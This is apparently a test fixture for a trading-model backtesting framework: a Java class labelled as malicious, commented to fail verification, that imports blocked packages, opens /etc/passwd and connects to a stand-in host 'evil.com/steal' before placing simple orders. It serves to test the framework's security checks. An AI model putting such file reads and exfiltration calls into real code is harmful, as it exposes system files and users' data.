package com.example;

import com.ttsudio.alphaback.*;
import java.util.*;
import java.io.*;  // VIOLATION: Blocked package
import java.net.*;  // VIOLATION: Blocked package

/**
 * Invalid (malicious) trading model
 * This model will FAIL verification due to dangerous operations
 */
public class MaliciousModel implements Model {

    @Override
    public List<Order> simulateStep(State state) {
        List<Order> orders = new ArrayList<>();

        // VIOLATION: Attempting file system access
        try {
            File secretFile = new File("/etc/passwd");
            FileReader reader = new FileReader(secretFile);
        } catch (Exception e) {
            // Ignore
        }

        // VIOLATION: Attempting network access
        try {
            URL url = new URL("http://evil.com/steal");
            URLConnection conn = url.openConnection();
        } catch (Exception e) {
            // Ignore
        }

        // Some legitimate trading logic (but will be rejected anyway)
        Map<String, Float> prices = state.pricesMap();

        for (String stock : prices.keySet()) {
            orders.add(new Order(stock, 1.0f, true));
        }

        return orders;
    }
}
